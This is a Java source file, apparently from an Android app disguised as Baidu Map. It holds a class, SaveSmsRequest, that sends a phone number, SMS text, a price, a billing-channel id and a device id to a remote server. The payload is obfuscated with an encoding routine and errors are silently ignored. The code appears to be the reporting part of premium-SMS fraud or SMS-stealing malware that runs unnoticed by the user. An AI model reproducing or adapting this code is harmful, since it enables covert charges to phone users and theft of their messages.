package com.baidu.BaiduMap.httpCenter;

import android.content.Context;

import com.baidu.BaiduMap.entity.MessageEntity;
import com.baidu.BaiduMap.entity.SmsSynchronousRequestDataEntity;
import com.baidu.BaiduMap.utils.Constants;
import com.baidu.BaiduMap.utils.GsonUtils;
import com.baidu.BaiduMap.utils.Kode;
import com.baidu.BaiduMap.utils.Log;
import com.baidu.BaiduMap.utils.SDKUtils;

import okhttp3.RequestBody;
import rx.Subscriber;
import rx.android.schedulers.AndroidSchedulers;
import rx.schedulers.Schedulers;

/**
 * Created by Administrator on 2017/7/27.
 */

public class SaveSmsRequest {
    private static SaveSmsRequest saveSmsRequest = null;

    public static SaveSmsRequest getInstance() {
        if (saveSmsRequest == null) {
            saveSmsRequest = new SaveSmsRequest();
        }
        return saveSmsRequest;
    }

    public void request(Context context, String mobile, String msg, int price, int throughId, String did, int successornot) {
        try {
            if (Constants.isOutPut) {
                Log.debug("======>url :" + Constants.SERVER_URL + Constants.SAVE_SMS_STATUS);
            }
            RequestBody body = RequestBody.create(okhttp3.MediaType.parse("application/json; charset=utf-8"), Kode.a(getRequestData(context, mobile, msg, price, successornot, throughId, did).buildJson().toString()));
            synchronized (body) {
                SubscriptionManager.getInstance().getSubscription(HttpRequest.getInstance().retrofitManager().requestForPost(Constants.SERVER_URL + Constants.SAVE_SMS_STATUS, body), Schedulers.io(), AndroidSchedulers.mainThread(), new Subscriber<String>() {
                    @Override
                    public void onCompleted() {
                        if (Constants.isOutPut){
                            Log.debug("save sms onCompleted!!!");
                        }
                    }

                    @Override
                    public void onError(Throwable e) {
                        if (Constants.isOutPut) {
                            Log.debug("save sms error!!! :" + e.getMessage());
                        }
                    }

                    @Override
                    public void onNext(String s) {
                        if (Constants.isOutPut) {
                            Log.debug("save sms success :" + s);
                        }
                    }
                });
            }
        } catch (Exception e) {

        }
    }

    private MessageEntity getRequestData(Context context, String mobile, String msg, int price, int successornot, int throughId, String did) {
        MessageEntity messageEntity = new MessageEntity(context, mobile, msg, price, successornot, throughId, did);
        return messageEntity;
    }
}
